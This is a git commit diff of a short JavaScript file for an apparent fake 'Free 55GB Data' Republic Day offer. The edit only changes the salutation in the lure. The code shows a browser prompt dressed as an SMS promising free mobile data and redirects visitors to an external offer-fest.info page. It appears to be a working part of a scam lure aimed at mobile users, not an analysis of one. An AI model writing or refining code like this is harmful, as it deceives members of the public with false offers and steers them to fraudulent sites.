a43675f2e3993dab3b4f588ca876099b883026be
ekpesense <abantak9@gmail.com>
2025-02-18 18:45:53 -0800

    Update activation-55gb-data-celebration.js

--- activation-55gb-data-celebration.js
+++ activation-55gb-data-celebration.js
@@ -1,6 +1,6 @@
 
 var password = 'FREE 55GB DATA'
-password=prompt(' SMS: Dear Citizen, kindly Receive Free 55GB Data, Happy Republic Day Offer, Press FREE 55GB DATA To Receive Now ','FREE 55GB DATA');
+password=prompt(' SMS: Dear Customer, kindly Receive Free 55GB Data, Happy Republic Day Offer, Press FREE 55GB DATA To Receive Now ','FREE 55GB DATA');
 if (password != 'FREE 55GB DATA') {
 location.href='https://offer-fest.info/55gb-data-celebration.html';
 }
